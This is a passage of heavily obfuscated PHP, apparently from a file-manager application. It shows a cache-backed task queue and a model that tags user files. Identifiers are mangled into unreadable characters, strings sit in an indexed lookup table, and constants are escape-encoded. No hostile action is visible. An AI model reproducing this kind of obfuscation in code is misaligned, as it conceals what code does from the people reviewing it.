$æÏß¦Òğ[8] . $ĞÀ…ùî[$æÏß¦Òğ[1149]] . LNG($æÏß¦Òğ[1874]); $ÉÈŒÕóø = $æÏß¦Òğ[12]; if ($ĞÀ…ùî[$æÏß¦Òğ[1858]]) { $Ù¿…ôˆŞ = $Š™ŒÜ°¥ . size_format($ĞÀ…ùî[$æÏß¦Òğ[1781]]) . $æÏß¦Òğ[8] . size_format($ĞÀ…ùî[$æÏß¦Òğ[1149]]); $ÉÈŒÕóø = size_format($ĞÀ…ùî[$æÏß¦Òğ[1783]]) . $æÏß¦Òğ[1875]; } if ($ĞÀ…ùî[$æÏß¦Òğ[1151]]) { $ĞÀ…ùî[$æÏß¦Òğ[1832]] = $ĞÀ…ùî[$æÏß¦Òğ[1151]] . $æÏß¦Òğ[53] . $ĞÀ…ùî[$æÏß¦Òğ[1832]]; } if ($ĞÀ…ùî[$æÏß¦Òğ[1832]]) { $ô‚•ÜšŞ = $æÏß¦Òğ[12]; if ($ĞÀ…ùî[$æÏß¦Òğ[1834]]) { $ô‚•ÜšŞ = $æÏß¦Òğ[50] . size_format($ĞÀ…ùî[$æÏß¦Òğ[1835]]) . $æÏß¦Òğ[8] . size_format($ĞÀ…ùî[$æÏß¦Òğ[1834]]); } $ÉÈŒÕóø .= $ĞÀ…ùî[$æÏß¦Òğ[1832]] . $ô‚•ÜšŞ; } if ($ĞÀ…ùî[$æÏß¦Òğ[846]] && !$ĞÀ…ùî[$æÏß¦Òğ[1834]]) { $ÉÈŒÕóø .= $æÏß¦Òğ[53] . size_format($ĞÀ…ùî[$æÏß¦Òğ[1839]]) . $æÏß¦Òğ[8] . size_format($ĞÀ…ùî[$æÏß¦Òğ[846]]); } echoLog($Ù¿…ôˆŞ . $æÏß¦Òğ[53] . $ÉÈŒÕóø, !0); } public function taskEnd($Îİá›»–) { $øÂÏ–½ß =& $_SERVER[²Ö÷öõ]; if (!$Îİá›»– || $this->taskID != $Îİá›»–[$øÂÏ–½ß[475]]) { return; } $ŞÍÚˆ±µ = $Îİá›»– ? $Îİá›»–[$øÂÏ–½ß[1781]] . $øÂÏ–½ß[8] . $Îİá›»–[$øÂÏ–½ß[1149]] . LNG($øÂÏ–½ß[1874]) . $øÂÏ–½ß[74] : $øÂÏ–½ß[12]; echoLog($øÂÏ–½ß[1876] . $Îİá›»–[$øÂÏ–½ß[1667]] . ($Îİá›»–[$øÂÏ–½ß[526]] ? $øÂÏ–½ß[74] . $Îİá›»–[$øÂÏ–½ß[526]] : $øÂÏ–½ß[12]) . $øÂÏ–½ß[74] . $ŞÍÚˆ±µ . $øÂÏ–½ß[1877] . sprintf($øÂÏ–½ß[933], timeFloat() - $Îİá›»–[$øÂÏ–½ß[1784]]) . $øÂÏ–½ß[1796]); $this->end(); } public function taskKill($“Ú½…©ô) { $ºø€Ø¤ =& $_SERVER[²Ö÷öõ]; if (!$“Ú½…©ô || $this->taskID != $“Ú½…©ô[$ºø€Ø¤[475]]) { return; } echoLog($ºø€Ø¤[1878] . $“Ú½…©ô[$ºø€Ø¤[1667]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\x75\145\165\145\x4c\145\156\147\x74\150"; const QUEUE_DATA = "\164\x61\x73\x6b\121\x75\145\165\145\x44\x61\164\141"; const QUEUE_TIME = "\164\x61\x73\x6b\121\165\x65\x75\145\x4c\141\x73\164\x52\165\x6e"; const QUEUE_THREAD = "\x74\x61\163\153\x51\x75\145\x75\145\124\150\x72\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($É¡«ğ‡, $ËºÚÄŒÍ = array(), $İ–×Ší = '', $Èç·ä’Š = '') { $–ÃÉ®À =& $_SERVER[²Ö÷öõ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Èç·ä’Š && array_find_by_field(self::$listData, $–ÃÉ®À[97], $Èç·ä’Š)) { return !0; } if ($Èç·ä’Š && array_find_by_field(self::$listDataAdd, $–ÃÉ®À[97], $Èç·ä’Š)) { return !0; } self::$listDataAdd[] = array($–ÃÉ®À[341] => $É¡«ğ‡, $–ÃÉ®À[1879] => $ËºÚÄŒÍ, $–ÃÉ®À[526] => $İ–×Ší, $–ÃÉ®À[97] => $Èç·ä’Š); return !0; } public static function addSubmit() { $¡¸âŸ­® =& $_SERVER[²Ö÷öõ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($¡¸âŸ­®[1880] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $¡¸âŸ­®[12], $¡¸âŸ­®[526])), $¡¸âŸ­®[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ô“ü²à¾, $Ç‚â÷©­ = array(), $ÔÂıˆş = '', $ÌËÓÔ™¹ = '') { $û“Â°İ» =& $_SERVER[²Ö÷öõ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $îÒšşÔ = self::getAll(); if ($ÌËÓÔ™¹ && array_find_by_field($îÒšşÔ, $û“Â°İ»[97], $ÌËÓÔ™¹)) { return !0; } $îÒšşÔ[] = array($û“Â°İ»[341] => $ô“ü²à¾, $û“Â°İ»[1879] => $Ç‚â÷©­, $û“Â°İ»[526] => $ÔÂıˆş, $û“Â°İ»[97] => $ÌËÓÔ™¹); self::setAll($îÒšşÔ); write_log($û“Â°İ»[1880] . $ÔÂıˆş, $û“Â°İ»[197]); return !0; } public static function run() { $è·¶·ñ… =& $_SERVER[²Ö÷öõ]; $Ìë¶šÃ° = self::getAll(); $Ä—Å×Ú = array_shift($Ìë¶šÃ°); if (!$Ä—Å×Ú) { return !1; } self::setAll($Ìë¶šÃ°); $ˆ¡Îò‰• = timeFloat(); $À±›ğ³Â = $è·¶·ñ…[12]; try { $À±›ğ³Â = Hook::apply($Ä—Å×Ú[$è·¶·ñ…[341]], $Ä—Å×Ú[$è·¶·ñ…[1879]]); } catch (Exception $¢¡²öâ±) { write_log($¢¡²öâ±, $è·¶·ñ…[1272]); } $”óğ€ş¢ = number_format(timeFloat() - $ˆ¡Îò‰•, 3) . $è·¶·ñ…[1796]; if ($À±›ğ³Â && is_string($À±›ğ³Â)) { $”óğ€ş¢ = $”óğ€ş¢ . $è·¶·ñ…[1881] . $À±›ğ³Â; } write_log($è·¶·ñ…[1882] . $Ä—Å×Ú[$è·¶·ñ…[526]] . $è·¶·ñ…[1883] . $”óğ€ş¢, $è·¶·ñ…[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $¸ìŸë =& $_SERVER[²Ö÷öõ]; $¶ÀÆûÄ = self::threadCount() + 1; if ($¶ÀÆûÄ > 3 || !self::count()) { return; } write_log($¸ìŸë[1884] . $¶ÀÆûÄ, $¸ìŸë[197]); Cache::set(self::QUEUE_THREAD, $¶ÀÆûÄ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($¸ìŸë[1885], $¸ìŸë[197]); } public static function getKey($ÆÀÜºÂî, $›Ì÷›ë‚ = "\x69\156\x74") { $Â°û‹ï  =& $_SERVER[²Ö÷öõ]; Cache::removeMemory($ÆÀÜºÂî); $ïÆˆ“Û´ = Cache::get($ÆÀÜºÂî); if ($›Ì÷›ë‚ == $Â°û‹ï [364]) { return $ïÆˆ“Û´ ? intval($ïÆˆ“Û´) : 0; } if ($›Ì÷›ë‚ == $Â°û‹ï [1886]) { return is_array($ïÆˆ“Û´) ? $ïÆˆ“Û´ : array(); } return $ïÆˆ“Û´; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[²Ö÷öõ][1886]); } public static function setAll($²€Ö¸Ş…) { $¢»–„Ü• = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($²€Ö¸Ş…), $¢»–„Ü•); Cache::set(self::QUEUE_DATA, $²€Ö¸Ş…, $¢»–„Ü•); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto CÌß«¯Õ“­; e‚¤êå–ë: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($Î¾ø‚ù) { $Š—óø =& $_SERVER[²Ö÷öõ]; return array($Š—óø[2095] => array($Š—óø[2509] . USER_ID, $Š—óø[2096])); } protected function listData() { $Î¼æ¬õš =& $_SERVER[²Ö÷öõ]; $±ËÙüÔª = array($Î¼æ¬õš[1771] => USER_ID, $Î¼æ¬õš[557] => array($Î¼æ¬õš[2099], 0)); $éäûµà± = $Î¼æ¬õš[2510]; $Èô‡Éš» = $this->field($éäûµà±)->where($±ËÙüÔª)->order($Î¼æ¬õš[2102])->select(); return $Èô‡Éš» ? $Èô‡Éš» : array(); } protected function addToTag($½„÷Ğ“«, $„ìÌ¾µÄ) { $ê†‰ğïò =& $_SERVER[²Ö÷öõ]; if (!Model($ê†‰ğïò[2246])->listData($„ìÌ¾µÄ)) { return !1; } if (is_numeric($½„÷Ğ“«)) { $Ùîø±úÉ = Model($ê†‰ğïò[907])->pathInfo($½„÷Ğ“«); if (!$Ùîø±úÉ) { return !1; } } else { $Ùîø±úÉ = IO::infoSimple($½„÷Ğ“«); if (!$Ùîø±úÉ) { return !1; } $×®Ÿ€‚ï = $Ùîø±úÉ[$ê†‰ğïò[32]]; $¼®­¤Áî = $Ùîø±úÉ[$ê†‰ğïò[33]]; if (isset($Ùîø±úÉ[$ê†‰ğïò[485]])) { $¼®­¤Áî = $Ùîø±úÉ[$ê†‰ğïò[485]] == $ê†‰ğïò[91] ? $ê†‰ğïò[78] : $ê†‰ğïò[230]; } } $”¤öö‰§ = array($ê†‰ğïò[1771] => USER_ID, $ê†‰ğïò[557] => $„ìÌ¾µÄ, $ê†‰ğïò[495] => $½„÷Ğ“«, $ê†‰ğïò[496] => $¼®­¤Áî ? $¼®­¤Áî : $ê†‰ğïò[490], $ê†‰ğïò[494] => $×®Ÿ€‚ï ? $×®Ÿ€‚ï : $ê†‰ğïò[12], $ê†‰ğïò[1984] => 0); if ($this->where($”¤öö‰§)->find()) { return !1; } return $this->add($”¤öö‰§); } protected function removeFromTag($’š‡à×Û, $êû‹Ï½Ø) { $£†âÉŸ¤ =& $_SERVER[²Ö÷öõ]; if (!Model($£†âÉŸ¤[2246])->listData($êû‹Ï½Ø)) { return !1; } if (is_array($’š‡à×Û)) { $’š‡à×Û = array($£†âÉŸ¤[7], $’š‡à×Û); } $âü™ãÂŠ = array($£†âÉŸ¤[1771] => USER_ID, $£†âÉŸ¤[557] => $êû‹Ï½Ø, $£†âÉŸ¤[495] => $’š‡à×Û); return $this->where($âü™ãÂŠ)->delete(); } protected function removeByTag($ºÚ¤³£) { $¦Â¬›Ìú =& $_SERVER[²Ö÷öõ]; if (!$ºÚ¤³£) { return !1; } $ú¾Ôûîï = array($¦Â¬›Ìú[1771] => USER_ID, $¦Â¬›Ìú[557] => $ºÚ¤³£); return $this->where($ú¾Ôûîï)->delete(); } protected function removeBySource($µ©œ¹) { $®Öºğ¿ =& $_SERVER[²Ö÷öõ]; if (is_array($µ©œ¹)) { $µ©œ¹ = array($®Öºğ¿[7], $µ©œ¹); } $í”«Ğ½¼ = array($®Öºğ¿[1771] => USER_ID, $®Öºğ¿[557] => array($®Öºğ¿[1100], 0), $®Öºğ¿[495] => $µ©œ¹); return $this->where($í”«Ğ½¼)->delete(); } }